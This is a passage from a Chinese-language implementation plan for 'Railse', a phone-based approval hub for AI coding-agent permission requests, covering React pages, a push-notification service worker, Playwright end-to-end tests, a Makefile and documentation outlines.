      (rs) => alive && setItems(rs),
      (e: unknown) => alive && setError(e instanceof Error ? e.message : '加载失败'),
    )
    return () => {
      alive = false
    }
  }, [filter, limit, state.tick])

  return (
    <>
      <header className="topbar">
        <h1>历史</h1>
      </header>
      <div className="page">
        <select className="input" value={filter} onChange={(e) => setFilter(e.target.value)} aria-label="筛选状态">
          {filters.map(([v, label]) => (
            <option key={v} value={v}>
              {label}
            </option>
          ))}
        </select>
        {error && <Banner tone="warn">{error}</Banner>}
        {items?.map((r) => (
          <Link className="card" key={r.id} to={`/r/${encodeURIComponent(r.id)}`}>
            <div className="row">
              <span className="where">{r.kind === 'webhook' ? 'webhook' : [r.machine_name, r.project].filter(Boolean).join(' · ')}</span>
              <span className="tag plain">{r.kind === 'permission' ? stateLabel(r.state) : kindLabel(r.kind)}</span>
              <span className="time">{relativeTime(r.created_at)}</span>
            </div>
            <pre className="cmd">{r.kind === 'permission' ? payloadSummary(r.payload) : r.title}</pre>
            {r.kind === 'permission' && decidedByLabel(r) && <div className="sub">{decidedByLabel(r)}</div>}
          </Link>
        ))}
        {items && items.length === 0 && <div className="empty">没有记录</div>}
        {items && items.length >= limit && limit < 500 && (
          <button type="button" className="btn block" onClick={() => setLimit(500)}>
            加载更多
          </button>
        )}
        {!items && !error && <div className="empty">加载中…</div>}
      </div>
    </>
  )
}
```

`web/src/pages/Rules.tsx`:
```tsx
import { useEffect, useRef, useState } from 'react'
import { hub } from '../api'
import { Banner } from '../components/Banner'
import { relativeTime } from '../format'
import { useStore } from '../StoreProvider'

const sourceNames: Record<string, string> = { builtin: '内置', user: '手写', learned: '学来的' }

export function Rules() {
  const { state, loadRules } = useStore()
  const [error, setError] = useState<string | null>(null)
  const [flash, setFlash] = useState<string | null>(null)
  const fileRef = useRef<HTMLInputElement>(null)

  useEffect(() => {
    if (state.rules === null || state.rulesStale) loadRules().catch((e: unknown) => setError(e instanceof Error ? e.message : '加载失败'))
  }, [state.rules, state.rulesStale, loadRules])

  async function run(fn: () => Promise<unknown>, ok?: string) {
    setError(null)
    try {
      await fn()
      await loadRules()
      if (ok) setFlash(ok)
    } catch (e) {
      setError(e instanceof Error ? e.message : '操作失败')
    }
  }

  async function importFile(file: File | undefined) {
    if (!file) return
    const text = await file.text()
    if (!window.confirm(`导入 ${file.name} 会整套替换 hub 上的规则并下发给所有机器，继续？`)) return
    await run(() => hub.importRules(text), '已导入并下发')
  }

  return (
    <>
      <header className="topbar">
        <h1>规则</h1>
        <a className="btn" href={hub.exportRulesURL} download="railse-rules.yaml">
          导出
        </a>
        <button type="button" className="btn" onClick={() => fileRef.current?.click()}>
          导入
        </button>
        <input ref={fileRef} type="file" accept=".yaml,.yml,text/yaml,application/yaml" hidden onChange={(e) => void importFile(e.target.files?.[0])} />
      </header>
      <div className="page">
        {error && <Banner tone="warn">{error}</Banner>}
        {flash && <Banner tone="ok">{flash}</Banner>}
        <p className="sub">新规则来自“批准并记住”或导入 YAML；这里只做查看、启停和删除。</p>
        {state.rules?.map((r) => (
          <details className="card" key={r.id}>
            <summary className="row" style={{ listStyle: 'none', cursor: 'pointer' }}>
              <span className="mono grow" style={{ flex: 1, wordBreak: 'break-all', opacity: r.enabled ? 1 : 0.5 }}>
                {r.id}
              </span>
              <span className="tag plain">{sourceNames[r.source] ?? r.source}</span>
              {r.elevated && <span className="tag high">可放行高风险操作</span>}
            </summary>
            <div className="sub" style={{ margin: '6px 0' }}>
              命中 {r.hit_count} 次{r.last_hit_at ? `，最近 ${relativeTime(r.last_hit_at)}` : ''}
              {r.created_from ? `，来自请求 ${r.created_from.slice(0, 8)}` : ''}
            </div>
            <pre className="block mono">{r.yaml}</pre>
            <div className="btn-row">
              <button type="button" className="btn" onClick={() => void run(() => hub.setRuleEnabled(r.id, !r.enabled))}>
                {r.enabled ? '停用' : '启用'}
              </button>
              {r.source !== 'builtin' && (
                <button
                  type="button"
                  className="btn danger"
                  onClick={() => {
                    if (window.confirm(`删除规则 ${r.id}？所有机器会立即收到更新。`)) void run(() => hub.deleteRule(r.id), '已删除')
                  }}
                >
                  删除
                </button>
              )}
            </div>
          </details>
        ))}
        {state.rules === null && !error && <div className="empty">加载中…</div>}
        {state.rules?.length === 0 && <div className="empty">没有规则</div>}
      </div>
    </>
  )
}
```

`web/src/pages/Machines.tsx`:
```tsx
import { useEffect, useState } from 'react'
import { hub } from '../api'
import { Banner } from '../components/Banner'
import { relativeTime } from '../format'
import { useStore } from '../StoreProvider'

export function Machines() {
  const { state, loadMachines } = useStore()
  const [error, setError] = useState<string | null>(null)

  useEffect(() => {
    loadMachines().catch((e: unknown) => setError(e instanceof Error ? e.message : '加载失败'))
  }, [loadMachines, state.tick])

  async function revoke(id: string, name: string) {
    if (!window.confirm(`吊销 ${name}？它的密钥立即失效，正在等待的请求会被取消；要重新接入得在那台机器上重新 enroll。`)) return
    try {
      await hub.revokeMachine(id)
      await loadMachines()
    } catch (e) {
      setError(e instanceof Error ? e.message : '吊销失败')
    }
  }

  return (
    <>
      <header className="topbar">
        <h1>机器</h1>
      </header>
      <div className="page">
        {error && <Banner tone="warn">{error}</Banner>}
        {state.machines?.map((m) => (
          <div className="list-item" key={m.id} style={{ opacity: m.revoked ? 0.5 : 1 }}>
            <span className={`dot ${m.online ? 'on' : ''}`} />
            <div className="grow">
              <div>
                {m.name} {m.revoked && <span className="tag plain">已吊销</span>}
              </div>
              <div className="sub">
                {m.agent_version || '版本未知'} · {m.online ? '在线' : m.last_seen ? `最近 ${relativeTime(m.last_seen)}` : '从未连上'} · 接入于 {relativeTime(m.enrolled_at)}
              </div>
            </div>
            {!m.revoked && (
              <button type="button" className="btn danger" onClick={() => void revoke(m.id, m.name)}>
                吊销
              </button>
            )}
          </div>
        ))}
        {state.machines === null && !error && <div className="empty">加载中…</div>}
        {state.machines?.length === 0 && (
          <div className="empty">
            还没有机器。在 hub 上运行 <code className="mono">railse hub token</code>，再在机器上运行 <code className="mono">railse agent enroll</code>。
          </div>
        )}
      </div>
    </>
  )
}
```

`web/src/pages/Settings.tsx`:
```tsx
import { useState } from 'react'
import { useNavigate } from 'react-router'
import { hub } from '../api'
import { Banner } from '../components/Banner'
import { useStore } from '../StoreProvider'

export function Settings() {
  const { state, reload } = useStore()
  const navigate = useNavigate()
  const [error, setError] = useState<string | null>(null)
  const [busy, setBusy] = useState(false)
  const paused = state.status?.paused ?? false

  async function togglePause() {
    setBusy(true)
    setError(null)
    try {
      await (paused ? hub.resume() : hub.pause())
      await reload()
    } catch (e) {
      setError(e instanceof Error ? e.message : '操作失败')
    } finally {
      setBusy(false)
    }
  }

  async function logout() {
    try {
      await hub.logout()
    } finally {
      navigate('/login', { replace: true })
    }
  }

  const online = state.status?.machines.filter((m) => m.online).length ?? 0
  return (
    <>
      <header className="topbar">
        <h1>设置</h1>
      </header>
      <div className="page">
        {error && <Banner tone="warn">{error}</Banner>}
        <label className="switch">
          <span>
            暂停自动审批
            <span className="sub"><br />打开后所有请求交回终端处理；手写的拒绝规则仍然生效</span>
          </span>
          <input type="checkbox" checked={paused} disabled={busy || !state.status} onChange={() => void togglePause()} />
        </label>
        {/* 通知区块：Task 10 */}
        <dl className="kv" style={{ marginTop: 16 }}>
          <dt>规则版本</dt>
          <dd>{state.status?.rules_version ?? '-'}</dd>
          <dt>在线机器</dt>
          <dd>
            {online} / {state.status?.machines.length ?? 0}
          </dd>
          <dt>hub 运行</dt>
          <dd>{state.status?.uptime ?? '-'}</dd>
        </dl>
        <button type="button" className="btn block" style={{ marginTop: 24 }} onClick={() => void logout()}>
          退出登录
        </button>
      </div>
    </>
  )
}
```

- [ ] **Step 2: 类型检查与构建**

Run: `cd web && npm run check && npm run build`
Expected: 通过。手工：规则页能看到两条内置规则、停用再启用；机器页列出已接入的机器；设置页切换暂停后收件箱顶部出现横幅，守护进程 `railse agent status` 显示 `(hub)`。

- [ ] **Step 3: 提交**

```bash
git add web/src/pages/History.tsx web/src/pages/Rules.tsx web/src/pages/Machines.tsx web/src/pages/Settings.tsx
git commit -m "feat(web): 历史、规则（启停删导入导出）、机器（吊销）与设置（总开关、退出）"
```

---

### Task 10: 网页推送：Service Worker、开启通知、订阅健康检查

**Files:**
- Replace: `web/public/sw.js`
- Create: `web/src/push.ts`、`web/src/push.test.ts`
- Modify: `web/src/pages/Settings.tsx`（通知区块）、`web/src/pages/Inbox.tsx`（通知失效横幅）

**Interfaces:**
- `sw.js`：`push` 事件必 `showNotification`（标题、正文、`tag` 为请求 id、`data.url`、图标）；`notificationclick` 先对已有窗口 `navigate` 再 `focus`，拿不到就 `openWindow`（两条路都写，iOS 实验第 4 节）；`pushsubscriptionchange` 用旧订阅的 `applicationServerKey` 重新订阅并 `POST /api/push/subscribe`；不做任何缓存（没有 `fetch` 处理器，避免旧壳子）
- `push.ts`：`type PushStatus = 'unsupported' | 'need_standalone' | 'hub_disabled' | 'denied' | 'off' | 'on' | 'stale'`；`classify(input: { supported, ios, standalone, hubEnabled, permission, hasSubscription, hubActive }): PushStatus`（纯函数）；`usePush()` hook 返回 `{ status, reason, publicKey, enable(), disable(), test(), refresh() }`：挂载时拉 `/api/push/vapid`、本地订阅与 `/api/push/check`；`enable()` 的第一个调用是 `subscribe(publicKey)`（内部第一句就是 `Notification.requestPermission()`，公钥已提前拉好，不在点击里等网络）
- 设置页通知区块：状态文案与按钮（开启 / 关闭 / 发一条测试通知）；`need_standalone` 时显示加到主屏幕的步骤；`hub_disabled` 显示 hub 的 reason
- 收件箱：`status === 'stale'`（本机有订阅但 hub 没有或 hub 说失效）时横幅“通知已失效，去设置重新开启”

- [ ] **Step 1: 写失败的测试**

`web/src/push.test.ts`:
```ts
import { describe, expect, it } from 'vitest'
import { classify } from './push'

const base = { supported: true, ios: false, standalone: true, hubEnabled: true, permission: 'default' as NotificationPermission, hasSubscription: false, hubActive: false }

describe('classify', () => {
  it('按优先级判断推送状态', () => {
    expect(classify({ ...base, supported: false })).toBe('unsupported')
    expect(classify({ ...base, supported: false, ios: true, standalone: false })).toBe('need_standalone')
    expect(classify({ ...base, ios: true, standalone: false })).toBe('need_standalone')
    expect(classify({ ...base, hubEnabled: false })).toBe('hub_disabled')
    expect(classify({ ...base, permission: 'denied' })).toBe('denied')
    expect(classify(base)).toBe('off')
    expect(classify({ ...base, permission: 'granted', hasSubscription: true, hubActive: true })).toBe('on')
    expect(classify({ ...base, permission: 'granted', hasSubscription: true, hubActive: false })).toBe('stale')
    expect(classify({ ...base, permission: 'granted', hasSubscription: false })).toBe('off')
  })
})
```

- [ ] **Step 2: 跑测试确认失败**

Run: `cd web && npx vitest run src/push.test.ts`
Expected: FAIL，`./push` 不存在。

- [ ] **Step 3: 写实现**

`web/src/push.ts`:
```ts
import { useCallback, useEffect, useState } from 'react'
import { ApiError, hub } from './api'
import { getSubscription, isIOS, isStandalone, pushSupported, subscribe } from './pwa'

export type PushStatus = 'unsupported' | 'need_standalone' | 'hub_disabled' | 'denied' | 'off' | 'on' | 'stale'

export interface ClassifyInput {
  supported: boolean
  ios: boolean
  standalone: boolean
  hubEnabled: boolean
  permission: NotificationPermission
  hasSubscription: boolean
  hubActive: boolean
}

/** 推送状态，按“先解决什么”的顺序判断。 */
export function classify(i: ClassifyInput): PushStatus {
  if (i.ios && !i.standalone) return 'need_standalone'
  if (!i.supported) return 'unsupported'
  if (!i.hubEnabled) return 'hub_disabled'
  if (i.permission === 'denied') return 'denied'
  if (i.hasSubscription && i.permission === 'granted') return i.hubActive ? 'on' : 'stale'
  return 'off'
}

export interface PushControl {
  status: PushStatus
  reason: string
  busy: boolean
  error: string | null
  enable: () => Promise<void>
  disable: () => Promise<void>
  test: () => Promise<void>
  refresh: () => Promise<void>
}

export function usePush(): PushControl {
  const [status, setStatus] = useState<PushStatus>('off')
  const [reason, setReason] = useState('')
  const [publicKey, setPublicKey] = useState('')
  const [busy, setBusy] = useState(false)
  const [error, setError] = useState<string | null>(null)

  const refresh = useCallback(async () => {
    const supported = pushSupported()
    let hubEnabled = false
    let key = ''
    let why = ''
    try {
      const v = await hub.pushVapid()
      hubEnabled = v.enabled
      key = v.public_key
      why = v.reason
    } catch (e) {
      why = e instanceof Error ? e.message : '读不到推送配置'
    }
    setPublicKey(key)
    setReason(why)
    let hasSubscription = false
    let hubActive = false
    const sub = supported ? await getSubscription().catch(() => null) : null
    if (sub) {
      hasSubscription = true
      try {
        hubActive = (await hub.pushCheck(sub.endpoint)).active
      } catch {
        hubActive = false
      }
    }
    setStatus(
      classify({
        supported,
        ios: isIOS(),
        standalone: isStandalone(),
        hubEnabled,
        permission: supported ? Notification.permission : 'default',
        hasSubscription,
        hubActive,
      }),
    )
  }, [])

  useEffect(() => {
    void refresh()
  }, [refresh])

  const enable = useCallback(async () => {
    setBusy(true)
    setError(null)
    try {
      // 第一个调用必须是授权请求（subscribe 的第一句），公钥已在 refresh 里拿好
      const sub = await subscribe(publicKey)
      await hub.pushSubscribe(sub.toJSON())
      await refresh()
    } catch (e) {
      setError(e instanceof Error ? e.message : '开启失败')
      await refresh()
    } finally {
      setBusy(false)
    }
  }, [publicKey, refresh])

  const disable = useCallback(async () => {
    setBusy(true)
    setError(null)
    try {
      const sub = await getSubscription()
      if (sub) {
        await hub.pushUnsubscribe(sub.endpoint).catch(() => undefined)
        await sub.unsubscribe()
      }
      await refresh()
    } catch (e) {
      setError(e instanceof Error ? e.message : '关闭失败')
    } finally {
      setBusy(false)
    }
  }, [refresh])

  const test = useCallback(async () => {
    setBusy(true)
    setError(null)
    try {
      const sub = await getSubscription()
      if (!sub) throw new Error('还没有开启通知')
      await hub.pushTest(sub.endpoint)
    } catch (e) {
      setError(e instanceof ApiError ? e.message : e instanceof Error ? e.message : '发送失败')
      await refresh()
    } finally {
      setBusy(false)
    }
  }, [refresh])

  return { status, reason, busy, error, enable, disable, test, refresh }
}
```

`web/public/sw.js`:
```js
// Railse Service Worker：只管推送与通知点击，不缓存任何资源（避免旧壳子）。
self.addEventListener('install', () => self.skipWaiting())
self.addEventListener('activate', (event) => event.waitUntil(self.clients.claim()))

// iOS 要求每条推送都显示通知，否则会吊销订阅。
self.addEventListener('push', (event) => {
  let data = { id: '', title: 'Railse', body: '', url: '/' }
  try {
    data = { ...data, ...event.data.json() }
  } catch {
    // 不是 JSON 的推送按默认文案显示
  }
  event.waitUntil(
    self.registration.showNotification(data.title, {
      body: data.body,
      tag: data.id || undefined,
      data: { url: data.url },
      icon: '/icons/icon-192.png',
      badge: '/icons/icon-192.png',
    }),
  )
})

// 点通知：优先让已有窗口跳转并前置；拿不到就开新窗口。打开哪条请求由页面读 URL 决定，这里不再回传。
self.addEventListener('notificationclick', (event) => {
  event.notification.close()
  const target = new URL((event.notification.data && event.notification.data.url) || '/', self.location.origin).href
  event.waitUntil(
    (async () => {
      const wins = await self.clients.matchAll({ type: 'window', includeUncontrolled: true })
      for (const w of wins) {
        if (typeof w.navigate === 'function') {
          try {
            const nav = await w.navigate(target)
            if (nav) {
              await nav.focus()
              return
            }
          } catch {
            // 这个窗口不能导航，试下一个
          }
        }
      }
      await self.clients.openWindow(target)
    })(),
  )
})

// 浏览器换了订阅：用同一个公钥重新订阅并登记到 hub。
self.addEventListener('pushsubscriptionchange', (event) => {
  event.waitUntil(
    (async () => {
      const old = event.oldSubscription
      const key = old && old.options && old.options.applicationServerKey
      if (!key) return
      const sub = await self.registration.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: key })
      await fetch('/api/push/subscribe', {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(sub.toJSON()),
      })
    })(),
  )
})
```

`web/src/pages/Settings.tsx` 里把 `{/* 通知区块：Task 10 */}` 换成：
```tsx
        <NotificationSection />
```
并在文件里加（导入 `usePush`、`Banner` 已导入）:
```tsx
const texts: Record<string, string> = {
  unsupported: '这个浏览器不支持通知',
  need_standalone: '先加到主屏幕：Safari 里点“分享”，选“添加到主屏幕”，再从图标打开',
  hub_disabled: 'hub 没有启用推送',
  denied: '通知权限被拒绝了，请到系统设置里允许 Railse 通知后重试',
  off: '开启后新审批会推送到这台手机',
  on: '通知已开启',
  stale: '通知已失效（hub 上没有这台手机的订阅），请重新开启',
}

function NotificationSection() {
  const p = usePush()
  return (
    <div style={{ marginTop: 16 }}>
      <div className="group-title">通知</div>
      <p>
        {texts[p.status]}
        {p.status === 'hub_disabled' && p.reason ? `：${p.reason}` : ''}
      </p>
      {p.error && <Banner tone="warn">{p.error}</Banner>}
      <div className="btn-row">
        {(p.status === 'off' || p.status === 'stale') && (
          <button type="button" className="btn primary" disabled={p.busy} onClick={() => void p.enable()}>
            开启通知
          </button>
        )}
        {p.status === 'on' && (
          <>
            <button type="button" className="btn" disabled={p.busy} onClick={() => void p.test()}>
              发一条测试通知
            </button>
            <button type="button" className="btn" disabled={p.busy} onClick={() => void p.disable()}>
              关闭通知
            </button>
          </>
        )}
        {p.status === 'stale' && (
          <button type="button" className="btn" disabled={p.busy} onClick={() => void p.disable()}>
            清除旧订阅
          </button>
        )}
      </div>
    </div>
  )
}
```

`web/src/pages/Inbox.tsx`：导入 `usePush`，组件里 `const push = usePush()`，在暂停横幅后面加：
```tsx
        {push.status === 'stale' && (
          <Banner tone="warn">
            通知已失效，新审批不会推送到这台手机。<Link to="/settings">去设置重新开启</Link>
          </Banner>
        )}
```

- [ ] **Step 4: 测试、构建与真机检查**

Run: `cd web && npm run check && npm run build`
Expected: 通过。

真机检查（需要一个固定 https 域名；没有正式域名时用 `cloudflared tunnel --url http://127.0.0.1:8787` 的临时域名，`railse hub run --public-url https://<域名> --secure-cookies --trusted-proxy 127.0.0.1`）：iPhone Safari 打开 → 加到主屏幕 → 从图标打开 → 登录 → 设置 → 开启通知（系统弹授权）→ “发一条测试通知”手机收到横幅 → 从另一台机器触发一次审批（或 webhook）→ 手机收到推送，点开直达该请求详情。把结果（含完全关闭、锁屏、数小时后三项，见 iOS 实验第 6 节）记到 `docs/superpowers/specs/2026-10-21-ios-webpush-findings.md` 末尾新增的“PWA 真机联调（第 4 份）”一节。

- [ ] **Step 5: 提交**

```bash
git add web/public/sw.js web/src/push.ts web/src/push.test.ts web/src/pages/Settings.tsx web/src/pages/Inbox.tsx docs/superpowers/specs/2026-10-21-ios-webpush-findings.md
git commit -m "feat(web): Service Worker 推送与通知点击直达请求，设置页开启通知，订阅失效提示"
```

---

### Task 11: Playwright 端到端、Makefile 与文档

**Files:**
- Create: `web/playwright.config.ts`、`web/e2e/global-setup.ts`、`web/e2e/global-teardown.ts`、`web/e2e/approve.spec.ts`
- Create: `scripts/e2e-web.sh`
- Create: `Makefile`
- Create: `docs/web.md`
- Modify: `docs/hub.md`（“网页”一节与 `make web`）、`docs/superpowers/specs/2026-10-21-railse-opc-design.md` §1.3、`README.md`（若存在，加一行网页说明）

**Interfaces:**
- 端到端用真实二进制：全局 setup 起 hub（临时目录、随机端口、`railse hub password` 设密码）与守护进程（`railse agent enroll` 后 `railse agent run`），把地址、socket、二进制路径写到 `web/.e2e/env.json`；测试里用 `child_process` 跑 `railse hook claude --socket …` 喂录制样本（改 cwd 与命令）模拟一次 Claude 的审批请求，它会阻塞到手机决定为止
- 用例（设计 6.1 第 4 条）：登录 → 收件箱空 → 触发 `curl https://api.example.com/v1/x`（联网，引擎答 ask，可以记住）→ 卡片出现 → 详情 → 批准并记住（看到草案“将放行 … api.example.com”）→ 钩子输出 `"behavior":"allow"` → 规则页多一条 learned 规则；再触发 `git push origin main` → 拒绝 → 钩子输出 `"behavior":"deny"`，历史里是“已拒绝，手机上决定”
- `make web`（构建网页到 `internal/hub/webui/dist`）、`make build`（先 web 再 Go）、`make test`（gofmt、vet、Go 测试、网页检查）、`make e2e`

- [ ] **Step 1: 写端到端**

`web/playwright.config.ts`:
```ts
import { defineConfig } from '@playwright/test'
import { existsSync, readFileSync } from 'node:fs'

const envFile = new URL('./.e2e/env.json', import.meta.url)
const env = existsSync(envFile) ? (JSON.parse(readFileSync(envFile, 'utf8')) as { baseURL: string }) : { baseURL: 'http://127.0.0.1:8787' }

export default defineConfig({
  testDir: './e2e',
  timeout: 120_000,
  workers: 1,
  retries: 0,
  globalSetup: './e2e/global-setup.ts',
  globalTeardown: './e2e/global-teardown.ts',
  use: { baseURL: env.baseURL, viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true },
  projects: [{ name: 'chromium', use: { browserName: 'chromium' } }],
})
```
（`globalSetup` 在加载配置之后才跑，所以 `baseURL` 在 setup 写完 `env.json` 后由测试自己再读一次，见 spec 里的 `readEnv()`。）

`web/e2e/global-setup.ts`:
```ts
import { spawn, spawnSync, type ChildProcess } from 'node:child_process'
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs'
import { createServer } from 'node:net'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'

export interface E2EEnv {
  baseURL: string
  bin: string
  hubDir: string
  agentDir: string
  socket: string
  repo: string
  password: string
  pids: number[]
}

const bin = resolve(process.cwd(), '.e2e/railse')
const password = 'e2e-password-123'

function freePort(): Promise<number> {
  return new Promise((res, rej) => {
    const s = createServer()
    s.listen(0, '127.0.0.1', () => {
      const addr = s.address()
      if (typeof addr === 'object' && addr) {
        const port = addr.port
        s.close(() => res(port))
      } else rej(new Error('no port'))
    })
  })
}

function run(args: string[], input?: string): string {
  const r = spawnSync(bin, args, { input, encoding: 'utf8' })
  if (r.status !== 0) throw new Error(`${args.join(' ')} 失败: ${r.stderr}`)
  return r.stdout
}

async function waitHttp(url: string, ms: number) {
  const until = Date.now() + ms
  while (Date.now() < until) {
    try {
      const r = await fetch(url)
      if (r.status === 401 || r.status === 200) return
    } catch {
      // 还没起来
    }
    await new Promise((r) => setTimeout(r, 100))
  }
  throw new Error(`hub 没有在 ${ms}ms 内起来: ${url}`)
}

async function waitFile(path: string, ms: number) {
  const { existsSync } = await import('node:fs')
  const until = Date.now() + ms
  while (Date.now() < until) {
    if (existsSync(path)) return
    await new Promise((r) => setTimeout(r, 100))
  }
  throw new Error(`没有等到 ${path}`)
}

export default async function globalSetup() {
  // 目录放在系统临时目录（Unix socket 路径有长度上限），短前缀
  const base = mkdtempSync(join(tmpdir(), 'rs'))
  const hubDir = join(base, 'h')
  const agentDir = join(base, 'a')
  const repo = join(base, 'repo')
  mkdirSync(join(repo, '.git'), { recursive: true })
  run(['hub', 'password', '--dir', hubDir], password + '\n')
  const port = await freePort()
  const baseURL = `http://127.0.0.1:${port}`
  const procs: ChildProcess[] = []
  const hub = spawn(bin, ['hub', 'run', '--dir', hubDir, '--listen', `127.0.0.1:${port}`], { stdio: 'ignore' })
  procs.push(hub)
  await waitHttp(baseURL + '/api/status', 10_000)
  const tok = /接入码: (\S+)/.exec(run(['hub', 'token', '--dir', hubDir]))?.[1]
  if (!tok) throw new Error('没有拿到接入码')
  run(['agent', 'enroll', '--dir', agentDir, '--hub', baseURL, '--token', tok, '--name', 'e2e-mac'])
  const agent = spawn(bin, ['agent', 'run', '--dir', agentDir], { stdio: 'ignore' })
  procs.push(agent)
  const socket = join(agentDir, 'agent.sock')
  await waitFile(socket, 10_000)
  const env: E2EEnv = { baseURL, bin, hubDir, agentDir, socket, repo, password, pids: procs.map((p) => p.pid ?? 0) }
  mkdirSync(resolve(process.cwd(), '.e2e'), { recursive: true })
  writeFileSync(resolve(process.cwd(), '.e2e/env.json'), JSON.stringify(env, null, 2))
}
```

`web/e2e/global-teardown.ts`:
```ts
import { existsSync, readFileSync, rmSync } from 'node:fs'
import { resolve } from 'node:path'
import type { E2EEnv } from './global-setup'

export default async function globalTeardown() {
  const file = resolve(process.cwd(), '.e2e/env.json')
  if (!existsSync(file)) return
  const env = JSON.parse(readFileSync(file, 'utf8')) as E2EEnv
  for (const pid of env.pids) {
    if (pid > 0) {
      try {
        process.kill(pid, 'SIGTERM')
      } catch {
        // 已经退出
      }
    }
  }
  await new Promise((r) => setTimeout(r, 1000))
  rmSync(env.hubDir, { recursive: true, force: true })
  rmSync(env.agentDir, { recursive: true, force: true })
  rmSync(env.repo, { recursive: true, force: true })
}
```

`web/e2e/approve.spec.ts`:
```ts
import { expect, test, type Page } from '@playwright/test'
import { execFile } from 'node:child_process'
import { readFileSync } from 'node:fs'
import { resolve } from 'node:path'
import type { E2EEnv } from './global-setup'

function readEnv(): E2EEnv {
  return JSON.parse(readFileSync(resolve(process.cwd(), '.e2e/env.json'), 'utf8')) as E2EEnv
}

/** 用录制的 Claude PermissionRequest 样本跑一次钩子：改 cwd 与命令。返回钩子退出后的 stdout。 */
function runHook(env: E2EEnv, command: string): Promise<string> {
  const sample = JSON.parse(readFileSync(resolve(process.cwd(), '../internal/adapter/testdata/claude/2.1.280/PermissionRequest.json'), 'utf8')) as Record<string, unknown>
  sample.cwd = env.repo
  sample.tool_input = { command }
  return new Promise((res, rej) => {
    const child = execFile(env.bin, ['hook', 'claude', '--socket', env.socket], { timeout: 110_000 }, (err, stdout) => {
      if (err) rej(err)
      else res(stdout)
    })
    child.stdin?.end(JSON.stringify(sample))
  })
}

async function login(page: Page, env: E2EEnv) {
  await page.goto(env.baseURL + '/')
  await expect(page).toHaveURL(/\/login/)
  await page.getByLabel('密码').fill(env.password)
  await page.getByRole('button', { name: '登录' }).click()
  await expect(page.getByText('没有等你处理的事')).toBeVisible()
}

test('登录、看到请求、批准并记住、规则多一条；再拒绝一条', async ({ page }) => {
  const env = readEnv()
  await login(page, env)

  // 1. 联网命令：引擎定不了，进收件箱；批准并记住
  const hook1 = runHook(env, 'curl https://api.example.com/v1/x')
  const card = page.locator('.card', { hasText: 'curl https://api.example.com/v1/x' })
  await expect(card).toBeVisible({ timeout: 15_000 })
  await expect(card.getByText('联网')).toBeVisible()
  await card.click()
  await expect(page.getByRole('heading', { name: '审批' })).toBeVisible()
  await page.getByRole('button', { name: '批准' }).click()
  await page.getByRole('checkbox').check()
  await expect(page.getByText(/将放行/)).toBeVisible()
  await expect(page.getByText(/api\\?\.example\\?\.com/)).toBeVisible() // 锚点可能是转义过的正则
  await page.getByRole('button', { name: '批准并记住' }).click()
  const out1 = await hook1
  expect(out1).toContain('"behavior":"allow"')
  await expect(page.getByText(/已批准/)).toBeVisible()

  await page.getByRole('link', { name: '规则' }).click()
  await expect(page.locator('.card', { hasText: '学来的' })).toHaveCount(1)
  await expect(page.locator('.card')).toHaveCount(3)

  // 2. 对外命令：拒绝
  await page.getByRole('link', { name: /收件箱/ }).click()
  const hook2 = runHook(env, 'git push origin main')
  const card2 = page.locator('.card', { hasText: 'git push origin main' })
  await expect(card2).toBeVisible({ timeout: 15_000 })
  await card2.click()
  await page.getByRole('button', { name: '拒绝' }).click()
  await page.getByLabel(/备注/).fill('先别推')
  await page.getByRole('button', { name: '拒绝', exact: true }).last().click()
  const out2 = await hook2
  expect(out2).toContain('"behavior":"deny"')
  await expect(page.getByText('已拒绝')).toBeVisible()

  await page.getByRole('link', { name: '历史' }).click()
  const hist = page.locator('.card', { hasText: 'git push origin main' })
  await expect(hist).toBeVisible()
  await expect(hist.getByText('手机上决定')).toBeVisible()
  await expect(page.getByRole('link', { name: /收件箱/ }).locator('.badge')).toHaveCount(0)
})
```
（`DecideSheet` 的面板里确认按钮文字是“拒绝”，与页面上触发按钮同名，所以用 `.last()`；若 Playwright 报歧义，给面板里的按钮加 `data-testid="confirm"` 并改用它。`page.getByLabel('密码')` 依赖登录页 `label` 包住 `input`，Task 7 的写法满足。）

`scripts/e2e-web.sh`:
```bash
#!/usr/bin/env bash
# 网页端到端：构建网页与二进制，Playwright 起真实 hub 与守护进程跑用例。
set -euo pipefail
cd "$(dirname "$0")/.."
(cd web && npm ci && npm run build)
mkdir -p web/.e2e
go build -o web/.e2e/railse ./cmd/railse
cd web
npx playwright install chromium
npx playwright test "$@"
```
`chmod +x scripts/e2e-web.sh`。

- [ ] **Step 2: 跑端到端**

Run: `scripts/e2e-web.sh`
Expected: 1 个用例通过。失败时看 `web/test-results/` 里的截图与 trace；常见原因：hub 没起来（看 `.e2e` 下 hub 目录的 `hub.log`）、钩子样本路径不对、`git push` 被当成别的风险等级（改命令为 `git push origin main`）。

- [ ] **Step 3: Makefile 与文档**

`Makefile`:
```make
.PHONY: web build test e2e

# 构建网页到 internal/hub/webui/dist（会被 go:embed 嵌进二进制）
web:
	cd web && npm ci && npm run build

# 先构建网页再编译二进制；不带网页的二进制也能跑，只是网页路径回“未构建”提示
build: web
	go build -o railse ./cmd/railse

test:
	test -z "$$(gofmt -l .)"
	go vet ./...
	go test ./... -race
	cd web && npm ci && npm run check

e2e:
	scripts/e2e-web.sh
```

`docs/web.md`（中文，约 90 行），内容：
1. **是什么**：手机优先的收件箱网页，由 hub 同源托管（`https://<hub>/`），加到主屏幕后是 PWA，能收 Web Push。
2. **构建与部署**：`make web` 把 Vite 产物放进 `internal/hub/webui/dist`，`make build` 编进二进制；hub 不需要额外配置；要推送须 `railse hub run --public-url https://<hub 域名>`，域名从第一天起固定（订阅与主屏幕应用都绑在源上）。
3. **第一次使用（iPhone）**：Safari 打开 hub 地址 → 登录 → 分享 → 添加到主屏幕 → 从图标打开 → 设置 → 开启通知（系统授权）→ 发一条测试通知。Safari 标签页里没有推送能力，首页会提示。
4. **页面**：收件箱（等你回答、按项目分组的待审批、顶部横幅的含义）、请求详情（含隐藏部分的告警，拒绝备注不会给 agent）、批准/拒绝/记住（草案预览、范围“项目”或“全局”、记不住的几种情况）、历史（筛选与依据）、规则（启停、删除、导入整套替换、导出、`可放行高风险操作` 标记的含义）、机器（吊销）、设置（暂停总开关与本机 pause 的关系、通知）。
